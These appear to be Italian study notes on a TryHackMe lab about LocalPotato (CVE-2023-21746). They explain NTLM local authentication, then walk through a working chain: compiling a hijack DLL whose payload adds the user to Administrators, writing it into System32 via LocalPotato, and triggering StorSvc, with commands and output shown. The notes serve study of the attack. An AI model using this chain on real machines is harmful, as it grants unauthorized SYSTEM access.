
#tryhackmelabs #laboratorio 

https://tryhackme.com/r/room/localpotato?ref=blog.tryhackme.com

[Il 9 settembre 2022, Andrea Pierini ( @decoder_it](https://twitter.com/decoder_it) ) e Antonio Cocomazzi ( [@splinter_code](https://twitter.com/splinter_code) ) hanno segnalato a Microsoft una vulnerabilità di escalation dei privilegi locali (LPE) in Windows . La vulnerabilità consentirebbe a un aggressore con un account con privilegi bassi su un host di leggere/scrivere file arbitrari con privilegi di SISTEMA.
Alla vulnerabilità è stata assegnata la sigla CVE- 2023-21746.


#### Aggiornamento dell'autenticazione NTLM

 Prima di spiegare il funzionamento di questa vulnerabilità, ripassiamo brevemente l' autenticazione NTLM .  

==Autenticazione NTLM==  

Il caso usuale di autenticazione NTLM riguarda un utente che tenta di autenticarsi su un server remoto. Nel processo di autenticazione sono coinvolti tre pacchetti:

- **Messaggio di tipo 1:** il client invia un pacchetto per negoziare i termini del processo di autenticazione. Il pacchetto contiene facoltativamente il nome della macchina client e il suo dominio. Il server riceve il pacchetto e può verificare che l'autenticazione sia stata avviata da una macchina diversa.
- **Messaggio di tipo 2:** il server risponde al client con una sfida. La "sfida" è un numero casuale utilizzato per autenticare il client senza dover passare le sue credenziali attraverso la rete.
- **Messaggio di tipo 3:** il client utilizza la sfida ricevuta sul messaggio di tipo 2 e la combina con l'hash della password dell'utente per generare una risposta alla sfida. La risposta viene inviata al server come parte del messaggio di tipo 3. In questo modo, il server può verificare se il client conosce l'hash della password corretto dell'utente senza trasferirlo tramite la rete.

==Autenticazione locale NTLM==

L'autenticazione locale NTLM viene utilizzata quando un utente tenta di accedere a un servizio in esecuzione sulla stessa macchina. Poiché sia ​​le applicazioni client che quelle server risiedono sulla stessa macchina, non è necessario il processo di sfida-risposta. L'autenticazione viene invece eseguita in modo diverso impostando un Security Context. Sebbene non ci addentreremo nei dettagli di ciò che è contenuto in un Security Context, consideralo come un set di parametri di sicurezza associati a una connessione, tra cui la chiave di sessione e l'utente i cui privilegi saranno utilizzati per la connessione.

Il processo prevede sempre gli stessi tre messaggi di prima, ma le informazioni utilizzate per l'autenticazione cambiano come segue:

- **Messaggio di tipo 1:**  il client invia questo messaggio per avviare la connessione. Viene utilizzato per negoziare i parametri di autenticazione proprio come prima, ma contiene anche il nome della macchina client e il suo dominio. Il server può controllare il nome e il dominio del client e il processo di autenticazione locale inizia se corrispondono ai propri.
- **Messaggio di tipo 2:** il server crea un Security Context e invia il suo ID al client in questo messaggio. Il client può quindi utilizzare il Security Context ID per associarsi alla connessione.
- **Messaggio di tipo 3:** se il client si associa correttamente a un Security Context ID esistente, viene inviato al server un messaggio di tipo 3 vuoto per segnalare che il processo di autenticazione locale è riuscito.

Poiché tutti i passaggi avvengono sulla stessa macchina, non c'è bisogno di seguire il metodo challenge-response come prima. La macchina può convalidare il Security Context ID sia per le applicazioni server che client.


#### LocalPotato

l PoC LocalPotato sfrutta un difetto in un caso speciale di autenticazione NTLM chiamato autenticazione locale NTLM per ingannare un processo privilegiato affinché autentichi una sessione avviata dall'attaccante sul server SMB locale . Di conseguenza, l'attaccante finisce per avere una connessione che gli garantisce l'accesso a tutte le condivisioni con i privilegi del processo ingannato, comprese le condivisioni speciali come `C$`o `ADMIN$`.

Il processo seguito dall'exploit è il seguente:

1. L'attaccante attiverà un processo privilegiato per connettersi a un server rogue sotto il suo controllo. Ciò funziona in modo simile ai precedenti exploit Potato, in cui un utente non privilegiato può forzare il sistema operativo a creare connessioni che utilizzano un utente privilegiato (solitamente SYSTEM).
2. Il server rogue istanzia un **Security Context A** per la connessione privilegiata ma non lo rispedisce immediatamente. Invece, l'attaccante lancerà un client rogue che avvia simultaneamente una connessione contro il server SMB locale (Windows File Sharing) con le sue attuali credenziali non privilegiate. Il client invierà il messaggio Type1 per avviare la connessione e il server risponderà inviando un messaggio Type2 con l'ID per un nuovo **Security Context** B.
3. L'attaccante scambierà gli ID di contesto da entrambe le connessioni in modo che il processo privilegiato riceva il contesto della connessione del server SMB anziché il proprio. Di conseguenza, il client privilegiato assocerà il suo utente (SYSTEM) al **Security Context B** della connessione SMB creata dall'attaccante. Di conseguenza, il client dell'attaccante può ora accedere a qualsiasi condivisione di rete con privilegi di SYSTEM!

Avendo una connessione privilegiata alle condivisioni SMB , l'attaccante può leggere o scrivere file sulla macchina di destinazione in qualsiasi posizione. Sebbene ciò non ci consenta di eseguire comandi direttamente sulla macchina vulnerabile, combineremo questo con un diverso vettore di attacco per raggiungere tale scopo.

Si noti che la vulnerabilità è nel protocollo NTLM piuttosto che nel server SMB , quindi questo stesso vettore di attacco potrebbe essere teoricamente utilizzato contro qualsiasi servizio che sfrutti l'autenticazione tramite NTLM .  In pratica, tuttavia, è necessario  tenere conto di alcune avvertenze quando si seleziona il protocollo da attaccare. Il PoC utilizza il server SMB per evitare alcune protezioni extra in atto per altri protocolli contro vettori di attacco simili e implementa persino un bypass rapido per far funzionare l'exploit contro il server SMB . Sebbene non entreremo in questi dettagli tecnici in questa stanza, puoi leggerli nel [post originale dell'autore dell'exploit](https://decoder.cloud/2023/02/13/localpotato-when-swapping-the-context-leads-you-to-system/) .

==riassunto==
LocalPotato è un tipo di attacco informatico che sfrutta una vulnerabilità nel protocollo di autenticazione NTLM, in particolare in un caso chiamato "autenticazione locale NTLM". Questo attacco permette a un malintenzionato di ingannare un processo con privilegi elevati (come l'amministratore di sistema) affinché accetti una connessione che il malintenzionato ha avviato.

Ecco come funziona in modo semplificato:

1. **Connessione a un server controllato**: L'attaccante fa partire un processo privilegiato che si connette a un server che lui stesso controlla. Questo è simile ad attacchi precedenti in cui un utente normale riesce a forzare il sistema a usare credenziali elevate.
    
2. **Creazione di un contesto di sicurezza**: Il server controllato dall'attaccante crea un "contesto di sicurezza" per la connessione privilegiata, ma non lo invia subito. Nel frattempo, l'attaccante avvia un client che si connette al server SMB (condivisione file di Windows) usando le sue credenziali normali.
    
3. **Scambio di informazioni**: L'attaccante scambia gli ID di contesto tra le due connessioni. In questo modo, il processo privilegiato utilizza il contesto della connessione SMB creata dall'attaccante, associando quindi l'utente privilegiato (SYSTEM) al contesto dell'attaccante.
    

Grazie a questo, l'attaccante ottiene accesso a tutte le condivisioni di rete con i privilegi di SYSTEM, il che significa che può leggere e scrivere file ovunque sulla macchina di destinazione.

È importante notare che la vulnerabilità riguarda il protocollo NTLM e non il server SMB stesso. Questo significa che l'attacco potrebbe teoricamente funzionare contro qualsiasi servizio che utilizza NTLM per l'autenticazione. Tuttavia, l'attaccante ha scelto di utilizzare SMB per evitare alcune protezioni presenti in altri protocolli.

#### Abuso di StorSvc per eseguire comandi

Finora, abbiamo usato LocalPotato per scrivere file su una macchina di destinazione, ma per ottenere una shell con privilegi elevati dobbiamo eseguire comandi. È stato scoperto un metodo che consente di sfruttare una DLL mancante per eseguire comandi con privilegi di sistema, ma richiede di scrivere la DLL in una cartella del sistema (PATH) accessibile solo a utenti privilegiati. Questo metodo è limitato a situazioni specifiche. Combinando questo nuovo metodo con LocalPotato, possiamo superare la restrizione del PATH e ottenere un attacco di escalation dei privilegi completamente funzionante.

==StorSvc e dirottamento DLL==

Come scoperto da BlackArrowSec, un aggressore può inviare una chiamata RPC al `SvcRebootToFlashingMode`metodo fornito dal `StorSvc`servizio, che a sua volta finirà per innescare un tentativo di caricamento di una DLL mancante denominata `SprintCSP.dll`.

Se non hai familiarità con RPC, pensala come un'API che espone funzioni in modo che possano essere utilizzate in remoto. In questo caso, il `StorSvc`servizio espone il `SvcRebootToFlashingMode`metodo, che chiunque abbia accesso alla macchina può chiamare.

Poiché StorSvc viene eseguito con privilegi di SISTEMA, la creazione di SprintCSP.dll da qualche parte nel PATH consentirà il caricamento di tale file ogni volta che  `SvcRebootToFlashingMode` verrà effettuata una chiamata a .

==Compilazione dell'Exploit==

Per sfruttare questo exploit, dovrai prima compilare entrambi i file forniti:

- **SprintCSP. dll** : questa è la DLL mancante che stiamo per dirottare. Il codice predefinito fornito con l'exploit eseguirà il comando whoami e restituirà la risposta a `C:\Program Data\whoamiall.txt`. Dovremo modificare il comando per eseguire una shell inversa.
- **RpcClient.exe** : questo programma attiverà la chiamata RPC a `SvcRebootToFlashingMode`. A seconda della versione di Windows che stai prendendo di mira, potresti dover modificare un po' il codice dell'exploit, poiché diverse versioni di Windows utilizzano identificatori di interfaccia diversi per esporre `SvcRebootToFlashingMode`.

I progetti per entrambi i file possono essere trovati su `C:\tools\LPE via StorSvc\`.

Iniziamo occupandoci di **RpcClient.exe** . Come detto in precedenza, dovremo modificare l'exploit a seconda della versione di Windows della macchina di destinazione. Per fare ciò, dovremo modificare le prime righe di `C:\tools\LPE via StorSvc\RpcClient\RpcClient\storsvc_c.c`in modo che venga scelto il sistema operativo corretto. Possiamo usare **Notepad++** facendo clic con il pulsante destro del mouse sul file e selezionando **Modifica con Notepad++** . Poiché la nostra macchina esegue Windows Server 2019, modificheremo il file in modo che appaia come segue:

```c
#if defined(_M_AMD64)

//#define WIN10
//#define WIN11
#define WIN2019
//#define WIN2022

...
```

Questo imposterà l'exploit per usare il corretto identificatore di interfaccia RPC per Windows 2019. 

Ora che il codice è stato corretto, apriamo un prompt dei comandi per sviluppatori usando il collegamento sul desktop. Compileremo il progetto eseguendo i seguenti comandi:

Prompt dei comandi

```shell-session
cd C:\tools\LPE via StorSvc\RpcClient\

msbuild RpcClient.sln 

move x64\Debug\RpcClient.exe C:\Users\user\Desktop\
```

L'eseguibile compilato sarà disponibile sul desktop.

Ora per compilare **SprintCSP. dll** , dobbiamo solo modificare la `DoStuff()`funzione on  `C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\main.c`in modo che esegua un comando che ci garantisca l'accesso privilegiato alla macchina. Per semplicità, faremo in modo che la DLL aggiunga il nostro utente corrente al gruppo **Administrators** . Ecco il codice con il nostro comando sostituito:

```c
void DoStuff() {

    // Replace all this code by your payload
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    CreateProcess(L"c:\\windows\\system32\\cmd.exe",L" /C net localgroup administrators user /add",
        NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows", &si, &pi);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return;
}
```

Ora compiliamo la DLL e spostiamo il risultato sul nostro desktop:

Prompt dei comandi

```shell-session
cd C:\tools\LPE via StorSvc\SprintCSP\

msbuild SprintCSP.sln
... some output ommitted ...

Build succeeded.
    6 Warning(s)
    0 Error(s)

move x64\Debug\SprintCSP.dll C:\Users\user\Desktop\ 
```

Ora siamo pronti a lanciare l'intera catena di exploit!

#### Elevare i nostri privilegi

Ora siamo pronti a lanciare l'exploit. Assicurati di avere l' `LocalPotato.exe`exploit, `RpcClient.exe`e i  `SprintCSP.dll`file sul desktop prima di procedere. In caso contrario, torna al task precedente per compilarli.

Cominciamo verificando che il nostro utente attuale non faccia parte del `Administrators`gruppo:  

Prompt dei comandi

```shell-session
C:\> net user user
User name                    user
Full Name

... some output omitted ...

Local Group Memberships      *Remote Desktop Users *Users
Global Group memberships     *None
The command completed successfully.
```

Per sfruttare con successo **StorSvc** , dobbiamo copiare `SprintCSP.dll`in una directory qualsiasi nel PATH corrente. Possiamo verificare il PATH eseguendo il seguente comando:

Prompt dei comandi

```shell-session
C:\> reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -v Path
    Path    REG_EXPAND_SZ    %SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem;
                             %SYSTEMROOT%\System32\WindowsPowerShell\v1.0\;%SYSTEMROOT%\System32\OpenSSH\;
                             C:\Program Files\Amazon\cfn-bootstrap\
```

Prenderemo di mira la `%SystemRoot%\system32`directory, che si espande in `C:\windows\system32`. Dovresti comunque essere in grado di usare una qualsiasi delle directory.

Per sicurezza, possiamo provare a copiare la DLL direttamente in `system32`, ma il nostro utente non avrà privilegi sufficienti per farlo:

Prompt dei comandi

```shell-session
C:\Users\user\Desktop> copy SprintCSP.dll C:\Windows\System32\SprintCSP.dll
Access is denied.
        0 file(s) copied.
```

Utilizzando LocalPotato, possiamo copiare SprintCSP.dll in system32 anche se stiamo utilizzando un utente senza privilegi: 

Prompt dei comandi

```shell-session
C:\Users\user\Desktop> LocalPotato.exe -i SprintCSP.dll -o \Windows\System32\SprintCSP.dll
 
         LocalPotato (aka CVE-2023-21746)
         by splinter_code & decoder_it
 
[*] Objref Moniker Display Name = objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGAQAAAAAAAABTIvXDdMIUbap+AepkeJ/yAcgAAMwIwArWEKZ3vRDmhjkAIwAHAEMASABBAE4ARwBFAC0ATQBZAC0ASABPAFMAVABOAEEATQBFAAAABwAxADAALgAxADAALgA0ADAALgAyADMAMQAAAAAACQD//wAAHgD//wAAEAD//wAACgD//wAAFgD//wAAHwD//wAADgD//wAAAAA=:
[*] Calling CoGetInstanceFromIStorage with CLSID:{854A20FB-2D44-457D-992F-EF13785D2B51}
[*] Marshalling the IStorage object... IStorageTrigger written: 100 bytes
[*] Received DCOM NTLM type 1 authentication from the privileged client
[*] Connected to the SMB server with ip 127.0.0.1 and port 445
[+] SMB Client Auth Context swapped with SYSTEM
[+] RPC Server Auth Context swapped with the Current User
[*] Received DCOM NTLM type 3 authentication from the privileged client
[+] SMB reflected DCOM authentication succeeded!
[+] SMB Connect Tree: \\127.0.0.1\c$  success
[+] SMB Create Request File: Windows\System32\SprintCSP.dll success
[+] SMB Write Request file: Windows\System32\SprintCSP.dll success
[+] SMB Close File success
[+] SMB Tree Disconnect success
```

Con la nostra DLL in posizione, ora possiamo eseguire `RpcClient.exe`per attivare la chiamata a  `SvcRebootToFlashingMode`, eseguendo di fatto il payload nella nostra DLL :

Prompt dei comandi

```shell-session
C:\Users\user\Desktop> RpcClient.exe
[+] Dll hijack triggered!
```

Per verificare se il nostro exploit ha funzionato come previsto, possiamo controllare se il nostro utente fa ora parte del gruppo Administrators:

Prompt dei comandi

```shell-session
C:\> net user user
User name                    user
Full Name
... some output omitted ...
Local Group Memberships      *Administrators       *Remote Desktop Users
                             *Users
Global Group memberships     *None
The command completed successfully.
```

Per generare un prompt dei comandi con privilegi di amministratore, puoi semplicemente fare clic con il pulsante destro del mouse e selezionare Esegui come amministratore utilizzando le credenziali del tuo utente. Ricorda che l'utente è `user`e la password è `Password123`:

Rispondi alle domande qui sotto

Eleva i tuoi privilegi sul sistema per ottenere una console amministrativa. Qual è il valore del flag in `C:\users\administrator\desktop\flag.txt`?

```
type C:\users\administrator\desktop\flag.txt
```

```
THM{xxxxxxxxxxx}
```



